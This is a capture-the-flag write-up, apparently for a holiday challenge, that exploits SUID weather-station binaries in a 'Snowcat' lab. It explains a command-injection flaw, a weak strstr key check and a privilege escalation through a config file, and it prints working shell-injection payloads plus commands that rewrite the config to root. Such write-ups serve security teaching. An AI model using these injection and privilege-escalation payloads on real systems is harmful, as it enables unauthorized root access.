# Snowcat RCE & Priv Esc

<img src="./images/media/image248.png" />
<img src="./images/media/image249.png"/>

Tom tells us about losing access to the neighborhood weather monitoring station. Whenever we click on the terminal, we are taken to a CLI for the weather monitoring station, which is using Snowcat, a variation of Tomcat. There has been a
recent RCE vulnerability found in Tomcat, so maybe we’ll have the same vulnerability found in Snowcat.

<img src="./images/media/image250.png"/>

There are some interesting files once we open the terminal. We see that there’s a python file for CVE-2025-24813 and a notes file which contains a wealth of information for us. We see there is also a ysoserial.jar file provided for us which we can use with our vulnerability. Let’s see what other opportunities might be available to us as well.

We check the SUID binaries. We see that we have three non-standard binary applications available:
/usr/local/weather/humidity,pressure,temperature

If we grep for /usr/local/weather/humidity and search recursively and irrespective of case sensitivity, we see that binary being called in /weather-jsps/dashboard.jsp

<img src="./images/media/image251.png" />
<img src="./images/media/image252.png" />
<img src="./images/media/image253.png" />

If we cat the dashboard file, we see that there is a key shown in the file and that the binaries are being run with a key as an option.

<img src="./images/media/image254.png" />

If we run one of the binaries, we see that it is specifically asking for a key as an option, so if we put in the key shown in the dashboard file, we get a return!

We can analyze this binary using any number of tools, but Dogbolt is quick and easy. If we export the binary as a b64 encoded string, then decode it using CyberChef, we can then download the binary and analyze it with Dogbolt.

<img src="./images/media/image255.png" />

<img src="./images/media/image256.png" />

<img src="./images/media/image257.png" />

Analyzing the binary shows us that we have three vulnerabilities within the code: Command Injection, Weak Input Validation, and a Privilege Escalation vector.

**1. Critical Vulnerability: Command Injection in log\_usage**

The most severe vulnerability is a **Command Injection** flaw in the log\_usage function.

**The Vulnerable Code:**
```
void log\_usage(undefined8 param\_1) {  
// ... variables ...  
snprintf(local\_118, 0x100, "%s \\%s\\ \\%s\\",
"/usr/local/weather/logUsage", "humidity", param\_1);  
system(local\_118);  
// ...  
}
```
**The Flaw:**

-   The function constructs a command string using snprintf.

-   It inserts param\_1 (which is the user-supplied &lt;key&gt; from main) directly into the command string inside single quotes.

-   It passes this string to system(), which executes it via /bin/sh -c.

**The Exploit:** An attacker can supply a "key" that contains a closing single quote ('), followed by a malicious command. Even though the input is "validated" earlier (see section 2 below), the validation logic is flawed.

-   **Payload Example:** `' ; /bin/sh ; \#`

-   **Resulting Command:** `/usr/local/weather/logUsage 'humidity' '' ;
    /bin/sh ; \#'`

-   **Outcome:** The shell closes the first command, executes `/bin/sh`, and comments out the rest.

**2. Logic Flaw: Weak Input Validation in is\_key\_authorized**

The binary attempts to validate the user input (param\_1) against a whitelist of keys, but the implementation allows for partial matches or "piggybacking."

**The Vulnerable Code:**

`pcVar3 = strstr(param\_1, local\_118);`

**The Flaw:**

-   strstr(haystack, needle) checks if the needle (the valid key from the file) exists *anywhere* inside the haystack (the user input).

-   It does **not** check if the user input is *equal* to the key, nor does it check length.

**The Exploit:** As long as the valid key is present *somewhere* in your input string, the check passes. This allows you to append the Command Injection payload from \#1 to a valid key.

-   **Valid Key:** 4b2f3c2d...

-   **Malicious Input:** `4b2f3c2d...'; /bin/sh; \#`

-   **Result:** strstr finds the valid key inside your malicious string, returns true, and then passes the *entire* malicious string to log\_usage.

**3. Privilege Escalation Vector: set\_effective\_ids**

This function is responsible for dropping or setting privileges, but it relies on an insecure configuration file.

**The Vulnerable Code:**
```
\_\_stream = fopen("/usr/local/weather/config","r");  
// ...  
\_\_isoc99\_fscanf(\_\_stream, "username=%63s\ngroupname=%63s",
local\_98, local\_58);  
// ...  
ppVar3 = getpwnam(local\_98); // Lookup user from config  
// ...  
setuid(ppVar3-&gt;pw\_uid); // Set UID to that user
```
**The Flaw:**

-   The binary trusts the contents of /usr/local/weather/config implicitly.

-   If an attacker can modify this file, they can control which user the binary runs as.

**The Exploit Chain:**

1.  **Initial Access:** Exploit the **Command Injection (#1)** to get a shell. Based on typical permissions, the binary likely runs as a specific user (e.g., weather) defined in the config.

2.  **Privilege Escalation:** If the current user (weather) has write access to /usr/local/weather/config, you can overwrite it:

    -   **Change username=weather to username=root.**

3.  **Re-execution:** Run the binary again. It reads the config, sees "root", calls setuid(0), and then triggers your Command Injection again—this time as Root.

So, after analyzing our binary file, we can try running our injection code to elevate to the "weather" user. If that is successful, then we can modify the /usr/local/weather/config file and run that injection again to elevate to root!

```
/usr/local/weather/humidity "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6'; python3 -c 'import os; os.system(\\/bin/bash\\)'; \#"
```

**After getting the shell:**

1.  Run id to verify you we the weather user.

2.  Overwrite the config file:  

    `echo "username=root" &gt; /usr/local/weather/config`  
    `echo "groupname=root" &gt;&gt; /usr/local/weather/config`

3.  Run the **exact same command** again to get root.

<img src="./images/media/image258.png"/>

Knowing all of this, we can create a one-click exploit to get us root and then find our other key. We could have definitely used the CVE shown, but why go the intended way whenever we can go our own way??

<img src="./images/media/image259.png" />

<img src="./images/media/image260.png" />
